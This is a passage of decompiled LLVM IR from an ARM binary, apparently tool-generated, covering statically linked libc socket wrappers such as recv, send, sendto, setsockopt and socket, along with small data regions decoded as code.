  %v2_11f04 = phi i32 [ %v3_11ed0, %entry ], [ %v2_11f04.pre, %dec_label_pc_11eec ]
  store i32 %v2_11f04, i32* @r7, align 4
  ret i32 %v1_11f08

; uselistorder directives
  uselistorder i32 %v0_11edc, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11f04, { 1, 0 }
}

define i32 @"$d.6"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11f0c:
  %v0_11f0c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11f0c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11f0c
  %v2_11f0c = load i32, i32* @lr, align 4
  %v8_11f0c = shl i32 %v2_11f0c, %arg2
  %v9_11f0c = and i32 %v8_11f0c, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11f0c, %bb
  %v4_11f10 = phi i32 [ %arg1, %dec_label_pc_11f0c ], [ %v9_11f0c, %bb ]
  ret i32 %v4_11f10

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_11f14 = load i32, i32* @r4, align 4
  store i32 %v3_11f14, i32* %stack_var_-12, align 4
  %v0_11f24 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11f24, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11f24, -4095
  br i1 %tmp, label %dec_label_pc_11f4c, label %dec_label_pc_11f34

dec_label_pc_11f34:                               ; preds = %entry
  %v0_11f38 = call i32 @__aeabi_read_tp()
  %v3_11f3c = load i16, i16* @global_var_22294.357, align 2
  %v4_11f3c = sext i16 %v3_11f3c to i32
  %v0_11f40 = load i32, i32* %r2.global-to-local, align 4
  %v1_11f40 = sub i32 0, %v0_11f40
  store i32 %v1_11f40, i32* %r2.global-to-local, align 4
  %v3_11f44 = add i32 %v4_11f3c, %v0_11f38
  %v4_11f44 = inttoptr i32 %v3_11f44 to i32*
  store i32 %v1_11f40, i32* %v4_11f44, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11f4c.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_11f4c

dec_label_pc_11f4c:                               ; preds = %entry, %dec_label_pc_11f34
  %v1_11f50 = phi i32 [ %v0_11f24, %entry ], [ -1, %dec_label_pc_11f34 ]
  %v2_11f4c = phi i32 [ %v3_11f14, %entry ], [ %v2_11f4c.pre, %dec_label_pc_11f34 ]
  store i32 %v2_11f4c, i32* @r4, align 4
  ret i32 %v1_11f50

; uselistorder directives
  uselistorder i32 %v0_11f24, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11f4c, { 1, 0 }
}

define i32 @"$d.5"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11f54:
  %v0_11f54 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11f54, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11f54
  %v2_11f54 = load i32, i32* @r7, align 4
  %v5_11f54 = udiv i32 %v2_11f54, 4
  %v6_11f54 = and i32 %v5_11f54, %arg1
  %v8_11f58 = lshr i32 %v6_11f54, %arg3
  %v9_11f58 = and i32 %v8_11f58, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11f54, %bb
  %v10_11f58 = phi i32 [ %arg1, %dec_label_pc_11f54 ], [ %v9_11f58, %bb ]
  ret i32 %v10_11f58

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @listen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11f5c = load i32, i32* @r7, align 4
  store i32 %v3_11f5c, i32* %stack_var_-8, align 4
  %v0_11f68 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11f68, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11f68, -4095
  br i1 %tmp, label %dec_label_pc_11f90, label %dec_label_pc_11f78

dec_label_pc_11f78:                               ; preds = %entry
  %v0_11f7c = call i32 @__aeabi_read_tp()
  %v3_11f80 = load i16, i16* @global_var_22294.357, align 2
  %v4_11f80 = sext i16 %v3_11f80 to i32
  %v0_11f84 = load i32, i32* %r2.global-to-local, align 4
  %v1_11f84 = sub i32 0, %v0_11f84
  store i32 %v1_11f84, i32* %r2.global-to-local, align 4
  %v3_11f88 = add i32 %v4_11f80, %v0_11f7c
  %v4_11f88 = inttoptr i32 %v3_11f88 to i32*
  store i32 %v1_11f84, i32* %v4_11f88, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11f90.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11f90

dec_label_pc_11f90:                               ; preds = %entry, %dec_label_pc_11f78
  %v1_11f94 = phi i32 [ %v0_11f68, %entry ], [ -1, %dec_label_pc_11f78 ]
  %v2_11f90 = phi i32 [ %v3_11f5c, %entry ], [ %v2_11f90.pre, %dec_label_pc_11f78 ]
  store i32 %v2_11f90, i32* @r7, align 4
  ret i32 %v1_11f94

; uselistorder directives
  uselistorder i32 %v0_11f68, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11f90, { 1, 0 }
}

define i32 @__sys_recv() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11f9c = load i32, i32* @r7, align 4
  store i32 %v3_11f9c, i32* %stack_var_-8, align 4
  %v0_11fa8 = load i32, i32* @r0, align 4
  store i32 %v0_11fa8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11fa8, -4095
  br i1 %tmp, label %dec_label_pc_11fd0, label %dec_label_pc_11fb8

dec_label_pc_11fb8:                               ; preds = %entry
  %v0_11fbc = call i32 @__aeabi_read_tp()
  %v3_11fc0 = load i16, i16* @global_var_22294.357, align 2
  %v4_11fc0 = sext i16 %v3_11fc0 to i32
  %v0_11fc4 = load i32, i32* %r2.global-to-local, align 4
  %v1_11fc4 = sub i32 0, %v0_11fc4
  store i32 %v1_11fc4, i32* %r2.global-to-local, align 4
  %v3_11fc8 = add i32 %v4_11fc0, %v0_11fbc
  %v4_11fc8 = inttoptr i32 %v3_11fc8 to i32*
  store i32 %v1_11fc4, i32* %v4_11fc8, align 4
  %v2_11fd0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11fd0

dec_label_pc_11fd0:                               ; preds = %entry, %dec_label_pc_11fb8
  %v1_11fd4 = phi i32 [ %v0_11fa8, %entry ], [ -1, %dec_label_pc_11fb8 ]
  %v2_11fd0 = phi i32 [ %v3_11f9c, %entry ], [ %v2_11fd0.pre, %dec_label_pc_11fb8 ]
  store i32 %v2_11fd0, i32* @r7, align 4
  ret i32 %v1_11fd4

; uselistorder directives
  uselistorder i32 %v0_11fa8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11fd0, { 1, 0 }
}

define i32 @"$d.4"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11fd8:
  %v0_11fd8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11fd8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11fd8
  %v2_11fdc = load i32, i32* @ip, align 4
  %v5_11fdc = sdiv i32 %v2_11fdc, 32
  %v6_11fdc = and i32 %v5_11fdc, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11fd8, %bb
  %v7_11fdc = phi i32 [ %arg1, %dec_label_pc_11fd8 ], [ %v6_11fdc, %bb ]
  ret i32 %v7_11fdc

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_11fe4 = load i32, i32* @r4, align 4
  store i32 %v3_11fe4, i32* %stack_var_-24, align 4
  %v6_11fe4 = load i32, i32* @r5, align 4
  %v9_11fe4 = load i32, i32* @r6, align 4
  %v12_11fe4 = load i32, i32* @r7, align 4
  %v15_11fe4 = load i32, i32* @r8, align 4
  %v18_11fe4 = load i32, i32* @lr, align 4
  %v4_11ff0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 12824) to i32*), align 4
  %v2_11ff4 = icmp eq i32 %v4_11ff0, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  br i1 %v2_11ff4, label %dec_label_pc_1200c, label %entry.dec_label_pc_12014_crit_edge

entry.dec_label_pc_12014_crit_edge:               ; preds = %entry
  br label %dec_label_pc_12014

dec_label_pc_1200c:                               ; preds = %entry
  store i32 %v3_11fe4, i32* @r4, align 4
  store i32 %v9_11fe4, i32* @r6, align 4
  store i32 %v12_11fe4, i32* @r7, align 4
  store i32 %v15_11fe4, i32* @r8, align 4
  %v0_12010 = call i32 @__sys_recv()
  br label %dec_label_pc_12014

dec_label_pc_12014:                               ; preds = %entry.dec_label_pc_12014_crit_edge, %dec_label_pc_1200c
  %v0_12014 = call i32 @__libc_enable_asynccancel()
  %v0_12018 = load i32, i32* @r6, align 4
  store i32 %v0_12018, i32* @r1, align 4
  store i32 %v0_12014, i32* @r5, align 4
  %v0_12028 = load i32, i32* @r4, align 4
  store i32 %v0_12028, i32* @r0, align 4
  %v0_1202c = call i32 @__sys_recv()
  store i32 %v0_1202c, i32* @r4, align 4
  %v0_12034 = load i32, i32* @r5, align 4
  %v1_12038 = call i32 @__libc_disable_asynccancel(i32 %v0_12034)
  %v0_1203c = load i32, i32* @r4, align 4
  %v2_12040 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_12040, i32* @r4, align 4
  store i32 %v6_11fe4, i32* @r5, align 4
  store i32 %v9_11fe4, i32* @r6, align 4
  store i32 %v12_11fe4, i32* @r7, align 4
  store i32 %v15_11fe4, i32* @r8, align 4
  store i32 %v18_11fe4, i32* @lr, align 4
  ret i32 %v0_1203c

; uselistorder directives
  uselistorder label %dec_label_pc_12014, { 1, 0 }
}

define i32 @__sys_recvfrom() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_12050 = load i32, i32* @r4, align 4
  store i32 %v3_12050, i32* %stack_var_-16, align 4
  %v0_12064 = load i32, i32* @r0, align 4
  store i32 %v0_12064, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12064, -4095
  br i1 %tmp, label %dec_label_pc_1208c, label %dec_label_pc_12074

dec_label_pc_12074:                               ; preds = %entry
  %v0_12078 = call i32 @__aeabi_read_tp()
  %v3_1207c = load i16, i16* @global_var_22294.357, align 2
  %v4_1207c = sext i16 %v3_1207c to i32
  %v0_12080 = load i32, i32* %r2.global-to-local, align 4
  %v1_12080 = sub i32 0, %v0_12080
  store i32 %v1_12080, i32* %r2.global-to-local, align 4
  %v3_12084 = add i32 %v4_1207c, %v0_12078
  %v4_12084 = inttoptr i32 %v3_12084 to i32*
  store i32 %v1_12080, i32* %v4_12084, align 4
  %v2_1208c.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_1208c

dec_label_pc_1208c:                               ; preds = %entry, %dec_label_pc_12074
  %v1_12090 = phi i32 [ %v0_12064, %entry ], [ -1, %dec_label_pc_12074 ]
  %v2_1208c = phi i32 [ %v3_12050, %entry ], [ %v2_1208c.pre, %dec_label_pc_12074 ]
  store i32 %v2_1208c, i32* @r4, align 4
  ret i32 %v1_12090

; uselistorder directives
  uselistorder i32 %v0_12064, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1208c, { 1, 0 }
}

define i32 @__libc_recvfrom(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_12098 = load i32, i32* @r4, align 4
  store i32 %v3_12098, i32* %stack_var_-32, align 4
  %v6_12098 = load i32, i32* @r5, align 4
  %v9_12098 = load i32, i32* @r6, align 4
  %v12_12098 = load i32, i32* @r7, align 4
  %v15_12098 = load i32, i32* @r8, align 4
  %v18_12098 = load i32, i32* @sb, align 4
  %v21_12098 = load i32, i32* @sl, align 4
  %v24_12098 = load i32, i32* @lr, align 4
  %v4_120a8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 12824) to i32*), align 4
  %v2_120b0 = icmp eq i32 %v4_120a8, 0
  store i32 %arg1, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_120b0, label %dec_label_pc_120d0, label %dec_label_pc_120dc

dec_label_pc_120d0:                               ; preds = %entry
  store i32 %v3_12098, i32* @r4, align 4
  store i32 %v12_12098, i32* @r7, align 4
  store i32 %v15_12098, i32* @r8, align 4
  store i32 %v18_12098, i32* %sb.global-to-local, align 4
  %v0_120d8 = call i32 @__sys_recvfrom()
  br label %dec_label_pc_120dc

dec_label_pc_120dc:                               ; preds = %entry, %dec_label_pc_120d0
  %v0_120dc = call i32 @__libc_enable_asynccancel()
  %v0_120e0 = load i32, i32* @r7, align 4
  store i32 %v0_120e0, i32* @r1, align 4
  store i32 %v0_120dc, i32* @r5, align 4
  %v0_120f0 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_120f0, i32* @r0, align 4
  %v0_120f8 = call i32 @__sys_recvfrom()
  store i32 %v0_120f8, i32* @r4, align 4
  %v0_12100 = load i32, i32* @r5, align 4
  %v1_12104 = call i32 @__libc_disable_asynccancel(i32 %v0_12100)
  %v0_12108 = load i32, i32* @r4, align 4
  %v2_12110 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_12110, i32* @r4, align 4
  store i32 %v6_12098, i32* @r5, align 4
  store i32 %v9_12098, i32* @r6, align 4
  store i32 %v12_12098, i32* @r7, align 4
  store i32 %v15_12098, i32* @r8, align 4
  store i32 %v18_12098, i32* @sb, align 4
  store i32 %v21_12098, i32* @sl, align 4
  store i32 %v24_12098, i32* @lr, align 4
  ret i32 %v0_12108

; uselistorder directives
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_120dc, { 1, 0 }
}

define i32 @__sys_send() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12120 = load i32, i32* @r7, align 4
  store i32 %v3_12120, i32* %stack_var_-8, align 4
  %v0_1212c = load i32, i32* @r0, align 4
  store i32 %v0_1212c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1212c, -4095
  br i1 %tmp, label %dec_label_pc_12154, label %dec_label_pc_1213c

dec_label_pc_1213c:                               ; preds = %entry
  %v0_12140 = call i32 @__aeabi_read_tp()
  %v3_12144 = load i16, i16* @global_var_22294.357, align 2
  %v4_12144 = sext i16 %v3_12144 to i32
  store i32 %v4_12144, i32* @r3, align 4
  %v0_12148 = load i32, i32* %r2.global-to-local, align 4
  %v1_12148 = sub i32 0, %v0_12148
  store i32 %v1_12148, i32* %r2.global-to-local, align 4
  %v3_1214c = add i32 %v4_12144, %v0_12140
  %v4_1214c = inttoptr i32 %v3_1214c to i32*
  store i32 %v1_12148, i32* %v4_1214c, align 4
  %v2_12154.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12154

dec_label_pc_12154:                               ; preds = %entry, %dec_label_pc_1213c
  %v1_12158 = phi i32 [ %v0_1212c, %entry ], [ -1, %dec_label_pc_1213c ]
  %v2_12154 = phi i32 [ %v3_12120, %entry ], [ %v2_12154.pre, %dec_label_pc_1213c ]
  store i32 %v2_12154, i32* @r7, align 4
  ret i32 %v1_12158

; uselistorder directives
  uselistorder i32 %v0_1212c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12154, { 1, 0 }
}

define i32 @"$d.3"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1215c:
  %v0_1215c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1215c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1215c
  %v2_12160 = load i32, i32* @r8, align 4
  %v5_12160 = sdiv i32 %v2_12160, 4
  %v6_12160 = and i32 %v5_12160, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1215c, %bb
  %v7_12160 = phi i32 [ %arg1, %dec_label_pc_1215c ], [ %v6_12160, %bb ]
  ret i32 %v7_12160

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_12168 = load i32, i32* @r4, align 4
  store i32 %v3_12168, i32* %stack_var_-24, align 4
  %v6_12168 = load i32, i32* @r5, align 4
  %v9_12168 = load i32, i32* @r6, align 4
  %v12_12168 = load i32, i32* @r7, align 4
  %v15_12168 = load i32, i32* @r8, align 4
  %v18_12168 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* @ip, align 4
  %v4_12174 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 12824) to i32*), align 4
  %v2_12178 = icmp eq i32 %v4_12174, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  br i1 %v2_12178, label %dec_label_pc_12190, label %entry.dec_label_pc_12198_crit_edge

entry.dec_label_pc_12198_crit_edge:               ; preds = %entry
  br label %dec_label_pc_12198

dec_label_pc_12190:                               ; preds = %entry
  store i32 %v3_12168, i32* @r4, align 4
  store i32 %v9_12168, i32* @r6, align 4
  store i32 %v12_12168, i32* @r7, align 4
  store i32 %v15_12168, i32* @r8, align 4
  %v0_12194 = call i32 @__sys_send()
  br label %dec_label_pc_12198

dec_label_pc_12198:                               ; preds = %entry.dec_label_pc_12198_crit_edge, %dec_label_pc_12190
  %v0_12198 = call i32 @__libc_enable_asynccancel()
  %v0_1219c = load i32, i32* @r6, align 4
  store i32 %v0_1219c, i32* @r1, align 4
  store i32 %v0_12198, i32* @r5, align 4
  %v0_121a8 = load i32, i32* @r8, align 4
  store i32 %v0_121a8, i32* @r3, align 4
  %v0_121ac = load i32, i32* @r4, align 4
  store i32 %v0_121ac, i32* @r0, align 4
  %v0_121b0 = call i32 @__sys_send()
  store i32 %v0_121b0, i32* @r4, align 4
  %v0_121b8 = load i32, i32* @r5, align 4
  %v1_121bc = call i32 @__libc_disable_asynccancel(i32 %v0_121b8)
  %v0_121c0 = load i32, i32* @r4, align 4
  %v2_121c4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_121c4, i32* @r4, align 4
  store i32 %v6_12168, i32* @r5, align 4
  store i32 %v9_12168, i32* @r6, align 4
  store i32 %v12_12168, i32* @r7, align 4
  store i32 %v15_12168, i32* @r8, align 4
  store i32 %v18_12168, i32* @lr, align 4
  ret i32 %v0_121c0

; uselistorder directives
  uselistorder label %dec_label_pc_12198, { 1, 0 }
}

define i32 @__sys_sendto() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_121d4 = load i32, i32* @r4, align 4
  store i32 %v3_121d4, i32* %stack_var_-16, align 4
  %v0_121e8 = load i32, i32* @r0, align 4
  store i32 %v0_121e8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_121e8, -4095
  br i1 %tmp, label %dec_label_pc_12210, label %dec_label_pc_121f8

dec_label_pc_121f8:                               ; preds = %entry
  %v0_121fc = call i32 @__aeabi_read_tp()
  %v3_12200 = load i16, i16* @global_var_22294.357, align 2
  %v4_12200 = sext i16 %v3_12200 to i32
  %v0_12204 = load i32, i32* %r2.global-to-local, align 4
  %v1_12204 = sub i32 0, %v0_12204
  store i32 %v1_12204, i32* %r2.global-to-local, align 4
  %v3_12208 = add i32 %v4_12200, %v0_121fc
  %v4_12208 = inttoptr i32 %v3_12208 to i32*
  store i32 %v1_12204, i32* %v4_12208, align 4
  %v2_12210.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_12210

dec_label_pc_12210:                               ; preds = %entry, %dec_label_pc_121f8
  %v1_12214 = phi i32 [ %v0_121e8, %entry ], [ -1, %dec_label_pc_121f8 ]
  %v2_12210 = phi i32 [ %v3_121d4, %entry ], [ %v2_12210.pre, %dec_label_pc_121f8 ]
  store i32 %v2_12210, i32* @r4, align 4
  ret i32 %v1_12214

; uselistorder directives
  uselistorder i32 %v0_121e8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12210, { 1, 0 }
}

define i32 @"$d.2"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_12218:
  %v0_12218 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12218, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_12218
  %v2_1221c = load i32, i32* @ip, align 4
  %v4_1221c = mul i32 %v2_1221c, 2
  %v5_1221c = and i32 %v4_1221c, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12218, %bb
  %v6_1221c = phi i32 [ %arg1, %dec_label_pc_12218 ], [ %v5_1221c, %bb ]
  ret i32 %v6_1221c

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_12220 = load i32, i32* @r4, align 4
  store i32 %v3_12220, i32* %stack_var_-32, align 4
  %v6_12220 = load i32, i32* @r5, align 4
  %v9_12220 = load i32, i32* @r6, align 4
  %v12_12220 = load i32, i32* @r7, align 4
  %v15_12220 = load i32, i32* @r8, align 4
  %v18_12220 = load i32, i32* @sb, align 4
  %v21_12220 = load i32, i32* @sl, align 4
  %v24_12220 = load i32, i32* @lr, align 4
  %v4_12230 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 12824) to i32*), align 4
  %v2_12238 = icmp eq i32 %v4_12230, 0
  store i32 %arg1, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_12238, label %dec_label_pc_12258, label %dec_label_pc_12264

dec_label_pc_12258:                               ; preds = %entry
  store i32 %v3_12220, i32* @r4, align 4
  store i32 %v12_12220, i32* @r7, align 4
  store i32 %v15_12220, i32* @r8, align 4
  store i32 %v18_12220, i32* %sb.global-to-local, align 4
  %v0_12260 = call i32 @__sys_sendto()
  br label %dec_label_pc_12264

dec_label_pc_12264:                               ; preds = %entry, %dec_label_pc_12258
  %v0_12264 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_12264, i32* @r5, align 4
  %v0_12278 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_12278, i32* @r0, align 4
  %v0_12280 = call i32 @__sys_sendto()
  store i32 %v0_12280, i32* @r4, align 4
  %v0_12288 = load i32, i32* @r5, align 4
  %v1_1228c = call i32 @__libc_disable_asynccancel(i32 %v0_12288)
  %v0_12290 = load i32, i32* @r4, align 4
  %v2_12298 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_12298, i32* @r4, align 4
  store i32 %v6_12220, i32* @r5, align 4
  store i32 %v9_12220, i32* @r6, align 4
  store i32 %v12_12220, i32* @r7, align 4
  store i32 %v15_12220, i32* @r8, align 4
  store i32 %v18_12220, i32* @sb, align 4
  store i32 %v21_12220, i32* @sl, align 4
  store i32 %v24_12220, i32* @lr, align 4
  ret i32 %v0_12290

; uselistorder directives
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12264, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_122a8 = load i32, i32* @r4, align 4
  store i32 %v3_122a8, i32* %stack_var_-12, align 4
  %v0_122b8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_122b8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_122b8, -4095
  br i1 %tmp, label %dec_label_pc_122e0, label %dec_label_pc_122c8

dec_label_pc_122c8:                               ; preds = %entry
  %v0_122cc = call i32 @__aeabi_read_tp()
  %v3_122d0 = load i16, i16* @global_var_22294.357, align 2
  %v4_122d0 = sext i16 %v3_122d0 to i32
  store i32 %v4_122d0, i32* @r3, align 4
  %v0_122d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_122d4 = sub i32 0, %v0_122d4
  store i32 %v1_122d4, i32* %r2.global-to-local, align 4
  %v3_122d8 = add i32 %v4_122d0, %v0_122cc
  %v4_122d8 = inttoptr i32 %v3_122d8 to i32*
  store i32 %v1_122d4, i32* %v4_122d8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_122e0.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_122e0

dec_label_pc_122e0:                               ; preds = %entry, %dec_label_pc_122c8
  %v1_122e4 = phi i32 [ %v0_122b8, %entry ], [ -1, %dec_label_pc_122c8 ]
  %v2_122e0 = phi i32 [ %v3_122a8, %entry ], [ %v2_122e0.pre, %dec_label_pc_122c8 ]
  store i32 %v2_122e0, i32* @r4, align 4
  ret i32 %v1_122e4

; uselistorder directives
  uselistorder i32 %v0_122b8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_122e0, { 1, 0 }
}

define i32 @"$d.1"(i16* %arg1) local_unnamed_addr {
dec_label_pc_122e8:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_122e8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_122e8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_122e8
  %v2_122e8 = load i32, i32* @r6, align 4
  %v5_122e8 = udiv i32 %v2_122e8, 4
  %v6_122e8 = and i32 %v5_122e8, %tmp
  store i32 %v6_122e8, i32* %r0.global-to-local, align 4
  %v2_122ec = inttoptr i32 %v6_122e8 to i16*
  store i16 8948, i16* %v2_122ec, align 2
  %v3_122ec = load i32, i32* @ip, align 4
  %v4_122ec = load i32, i32* %r0.global-to-local, align 4
  %v5_122ec = sub i32 %v4_122ec, %v3_122ec
  store i32 %v5_122ec, i32* %r0.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_122e8, %bb
  %v6_122ec = phi i32 [ %tmp, %dec_label_pc_122e8 ], [ %v5_122ec, %bb ]
  ret i32 %v6_122ec

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_122f0 = load i32, i32* @r7, align 4
  store i32 %v3_122f0, i32* %stack_var_-8, align 4
  %v0_122fc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_122fc, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_122fc, -4095
  br i1 %tmp, label %dec_label_pc_12324, label %dec_label_pc_1230c

dec_label_pc_1230c:                               ; preds = %entry
  %v0_12310 = call i32 @__aeabi_read_tp()
  %v3_12314 = load i16, i16* @global_var_22294.357, align 2
  %v4_12314 = sext i16 %v3_12314 to i32
  store i32 %v4_12314, i32* @r3, align 4
  %v0_12318 = load i32, i32* %r2.global-to-local, align 4
  %v1_12318 = sub i32 0, %v0_12318
  store i32 %v1_12318, i32* %r2.global-to-local, align 4
  %v3_1231c = add i32 %v4_12314, %v0_12310
  %v4_1231c = inttoptr i32 %v3_1231c to i32*
  store i32 %v1_12318, i32* %v4_1231c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12324.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12324

dec_label_pc_12324:                               ; preds = %entry, %dec_label_pc_1230c
